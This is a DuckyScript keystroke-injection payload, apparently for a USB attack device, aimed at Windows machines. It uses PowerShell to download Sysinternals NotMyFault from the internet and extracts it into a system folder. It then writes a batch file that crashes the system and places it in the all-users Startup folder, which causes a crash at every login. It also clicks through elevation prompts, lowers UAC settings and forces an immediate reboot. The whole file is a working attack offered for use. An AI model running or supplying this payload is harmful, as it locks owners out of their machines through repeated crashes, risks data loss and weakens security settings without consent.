    DELAY 5000
    GUI r
    DELAY 600
    STRING powershell
    DELAY 600
    ENTER
    DELAY 900
    STRING curl -o havefun.zip "https://download.sysinternals.com/files/NotMyFault.zip"
    DELAY 700
    ENTER
    DELAY 10000
    STRING exit
    DELAY 600
    ENTER
    DELAY 700
    GUI r
    DELAY 700
    STRING cmd
    DELAY 700
    ENTER
    DELAY 900
    STRING echo %username% |clip
    DELAY 700
    ENTER
    DELAY 700
    STRING exit
    DELAY 700
    ENTER
    DELAY 700
    GUI r
    DELAY 700
    STRING powershell
    DELAY 700
    CONTROL SHIFT ENTER
    DELAY 800
    LEFTARROW
    DELAY 700
    ENTER
    DELAY 700
    STRING Expand-Archive -Path "C:\Users\
    DELAY 700
    CONTROL v
    DELAY 900
    BACKSPACE
    DELAY 700
    BACKSPACE
    DELAY 900
    STRING \
    DELAY 700
    STRING havefun.zip" -DestinationPath "C:\Windows\Installer"
    DELAY 700
    ENTER
    DELAY 1500
    STRING exit
    DELAY 700
    ENTER
    DELAY 700
    GUI r
    DELAY 600
    STRING notepad
    DELAY 600
    ENTER
    DELAY 600
    STRING @echo off
    DELAY 600
    ENTER
    STRING C:\Windows\Installer\notmyfault.exe /crash
    DELAY 600
    CONTROL s
    ALT d
    DELAY 800
    STRING Documents
    DELAY 800
    ENTER
    DELAY 700
    ALT n
    DELAY 800
    STRING and i oop.bat
    DELAY 850
    ALT t
    DELAY 700
    DOWNARROW
    DELAY 700
    DOWNARROW
    DELAY 700
    ENTER
    DELAY 700
    ALT s
    DELAY 800
    ALT F4
    DELAY 800
    GUI r
    DELAY 800
    STRING cmd
    DELAY 800
    CONTROL SHIFT ENTER
    DELAY 800
    LEFTARROW
    DELAY 850
    ENTER
    DELAY 800
    STRING echo %username% |clip
    DELAY 800
    ENTER
    DELAY 800
    STRING cd..
    DELAY 800
    ENTER
    DELAY 800
    STRING cd..
    DELAY 800
    ENTER
    DELAY 800
    STRING cd Users\
    DELAY 800
    CONTROL v
    DELAY 900
    ENTER
    DELAY 800
    STRING move "Documents\and i oop.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    DELAY 800
    ENTER
    DELAY 900
    STRING C:\Windows\System32\UserAccountControlSettings.exe
    DELAY 700
    ENTER
    DELAY 800
    TAB
    DELAY 700
    DOWNARROW
    DELAY 700
    DOWNARROW
    DELAY 700
    TAB
    DELAY 700
    ENTER
    DELAY 800
    LEFTARROW
    DELAY 700
    ENTER
    DELAY 800
    STRING shutdown /r /t 0
    DELAY 700
    ENTER    
